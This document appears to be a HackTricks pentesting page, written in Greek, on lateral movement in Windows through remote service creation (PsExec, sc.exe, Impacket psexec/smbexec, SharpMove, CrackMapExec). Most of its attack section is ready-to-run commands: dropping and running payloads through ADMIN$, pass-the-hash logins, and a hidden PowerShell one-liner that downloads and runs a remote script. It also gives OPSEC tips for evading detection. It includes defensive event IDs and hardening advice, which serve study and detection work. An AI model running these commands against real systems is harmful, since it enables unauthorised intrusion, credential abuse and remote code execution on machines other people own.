# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργούν

Αυτές οι τεχνικές κάνουν abuse στον Windows Service Control Manager (SCM) απομακρυσμένα μέσω SMB/RPC για την εκτέλεση εντολών σε ένα target host. Η συνήθης ροή είναι:

1. Γίνεται authentication στο target και πρόσβαση στο ADMIN$ share μέσω SMB (TCP/445).
2. Αντιγράφεται ένα executable ή καθορίζεται μια LOLBAS command line που θα εκτελέσει το service.
3. Δημιουργείται απομακρυσμένα ένα service μέσω SCM (MS-SCMR μέσω \PIPE\svcctl), το οποίο δείχνει σε αυτή την εντολή ή το binary.
4. Εκκινείται το service για την εκτέλεση του payload και, προαιρετικά, γίνεται capture των stdin/stdout μέσω named pipe.
5. Διακόπτεται το service και γίνεται cleanup (διαγραφή του service και τυχόν dropped binaries).

Requirements/prereqs:
- Local Administrator στο target (SeCreateServicePrivilege) ή ρητά δικαιώματα δημιουργίας service στο target.
- Το SMB (445) πρέπει να είναι reachable και το ADMIN$ share διαθέσιμο· το Remote Service Management πρέπει να επιτρέπεται μέσω του host firewall.
- UAC Remote Restrictions: με local accounts, το token filtering μπορεί να εμποδίσει τον admin μέσω του network, εκτός αν χρησιμοποιείται ο built-in Administrator ή `LocalAccountTokenFilterPolicy=1`.
- Kerberos vs NTLM: η χρήση hostname/FQDN ενεργοποιεί Kerberos· η σύνδεση μέσω IP συχνά κάνει fallback σε NTLM (και μπορεί να είναι blocked σε hardened environments).

### Manual ScExec/WinExec μέσω sc.exe

Το παρακάτω δείχνει μια minimal προσέγγιση δημιουργίας service. Το service image μπορεί να είναι ένα dropped EXE ή ένα LOLBAS όπως το cmd.exe ή το powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Σημειώσεις:
- Αναμένετε σφάλμα timeout κατά την εκκίνηση ενός EXE που δεν είναι service· η εκτέλεση πραγματοποιείται κανονικά.
- Για πιο OPSEC-friendly λειτουργία, προτιμήστε fileless commands (`cmd /c`, `powershell -enc`) ή διαγράψτε τα dropped artifacts.

Βρείτε πιο λεπτομερή βήματα στο: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Εργαλεία και παραδείγματα

### Sysinternals PsExec.exe

- Κλασικό admin tool που χρησιμοποιεί SMB για να κάνει drop το PSEXESVC.exe στο ADMIN$, εγκαθιστά ένα προσωρινό service (προεπιλεγμένο όνομα PSEXESVC) και κάνει proxy το I/O μέσω named pipes.
- Παραδείγματα χρήσης:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Μπορείτε να εκκινήσετε απευθείας από το Sysinternals Live μέσω WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Αφήνει συμβάντα εγκατάστασης/απεγκατάστασης υπηρεσίας (το όνομα της υπηρεσίας είναι συχνά PSEXESVC, εκτός αν χρησιμοποιείται το -r) και δημιουργεί το C:\Windows\PSEXESVC.exe κατά την εκτέλεση.

### Impacket psexec.py (PsExec-like)

- Χρησιμοποιεί μια ενσωματωμένη υπηρεσία τύπου RemCom. Αποθέτει ένα προσωρινό binary υπηρεσίας (συνήθως με τυχαιοποιημένο όνομα) μέσω του ADMIN$, δημιουργεί μια υπηρεσία (συνήθως με προεπιλεγμένο όνομα RemComSvc) και κάνει proxy το I/O μέσω ενός named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Τεχνουργήματα
- Προσωρινό EXE στο C:\Windows\ (8 τυχαίοι χαρακτήρες). Το όνομα της υπηρεσίας είναι RemComSvc από προεπιλογή, εκτός αν παρακαμφθεί.

### Impacket smbexec.py (SMBExec)

- Δημιουργεί μια προσωρινή υπηρεσία που εκκινεί το cmd.exe και χρησιμοποιεί ένα named pipe για I/O. Γενικά αποφεύγει την απόθεση ενός πλήρους EXE payload· η εκτέλεση εντολών είναι ημι-διαδραστική.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral και SharpMove

- Το [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) υλοποιεί διάφορες μεθόδους lateral movement, συμπεριλαμβανομένου του service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- Το [SharpMove](https://github.com/0xthirteen/SharpMove) περιλαμβάνει τροποποίηση/δημιουργία υπηρεσίας για την απομακρυσμένη εκτέλεση μιας εντολής.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Μπορείτε επίσης να χρησιμοποιήσετε το CrackMapExec για εκτέλεση μέσω διαφορετικών backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detection και artifacts

Τυπικά artifacts σε host/network κατά τη χρήση τεχνικών τύπου PsExec:
- Τα Security 4624 (Logon Type 3) και 4672 (Special Privileges) στο target για τον admin account που χρησιμοποιήθηκε.
- Τα Security 5140/5145 File Share και File Share Detailed events, που εμφανίζουν πρόσβαση στο ADMIN$ και create/write των service binaries (π.χ. PSEXESVC.exe ή τυχαίο 8-char .exe).
- Το Security 7045 Service Install στο target: service names όπως PSEXESVC, RemComSvc ή custom (-r / -service-name).
- Το Sysmon 1 (Process Create) για το services.exe ή το service image, το 3 (Network Connect), το 11 (File Create) στο C:\Windows\, και τα 17/18 (Pipe Created/Connected) για pipes όπως \\.\pipe\psexesvc, \\.\pipe\remcom_* ή τα αντίστοιχα randomized.
- Registry artifact για το Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 στο operator host (αν δεν έχει γίνει suppress).

Ιδέες για hunting
- Δημιουργήστε alert για service installs όπου το ImagePath περιλαμβάνει cmd.exe /c, powershell.exe ή τοποθεσίες TEMP.
- Αναζητήστε process creations όπου το ParentImage είναι C:\Windows\PSEXESVC.exe ή children του services.exe που εκτελούνται ως LOCAL SYSTEM και εκτελούν shells.
- Επισημάνετε named pipes που τελειώνουν σε -stdin/-stdout/-stderr ή σε γνωστά PsExec clone pipe names.

## Troubleshooting συνηθισμένων failures
- Access is denied (5) κατά τη δημιουργία services: δεν υπάρχει πραγματικό local admin privilege, ισχύουν UAC remote restrictions για local accounts ή υπάρχει EDR tampering protection στη service binary path.
- The network path was not found (53) ή αδυναμία σύνδεσης στο ADMIN$: firewall που μπλοκάρει SMB/RPC ή απενεργοποιημένα admin shares.
- Το Kerberos αποτυγχάνει αλλά το NTLM είναι blocked: συνδεθείτε χρησιμοποιώντας hostname/FQDN (όχι IP), βεβαιωθείτε ότι υπάρχουν τα σωστά SPNs ή δώστε -k/-no-pass με tickets όταν χρησιμοποιείτε Impacket.
- Το service start κάνει timeout αλλά το payload εκτελέστηκε: αναμενόμενο όταν δεν πρόκειται για πραγματικό service binary· κάντε capture το output σε αρχείο ή χρησιμοποιήστε smbexec για live I/O.

## Hardening notes
- Τα Windows 11 24H2 και Windows Server 2025 απαιτούν SMB signing by default για outbound (και Windows 11 inbound) connections. Αυτό δεν διακόπτει τη legitimate χρήση του PsExec με valid creds, αλλά αποτρέπει το unsigned SMB relay abuse και μπορεί να επηρεάσει συσκευές που δεν υποστηρίζουν signing.<sup>[[2]](#references)</sup>
- Το νέο SMB client NTLM blocking (Windows 11 24H2/Server 2025) μπορεί να αποτρέψει το NTLM fallback κατά τη σύνδεση μέσω IP ή σε non-Kerberos servers. Σε hardened environments αυτό θα διακόψει το NTLM-based PsExec/SMBExec· χρησιμοποιήστε Kerberos (hostname/FQDN) ή ρυθμίστε exceptions όταν αυτό απαιτείται legitimately.<sup>[[2]](#references)</sup>
- Principle of least privilege: ελαχιστοποιήστε τη συμμετοχή σε local admin groups, προτιμήστε Just-in-Time/Just-Enough Admin, επιβάλετε LAPS και παρακολουθείτε/δημιουργήστε alerts για 7045 service installs.

## Δείτε επίσης

- WMI-based remote exec (συχνά περισσότερο fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
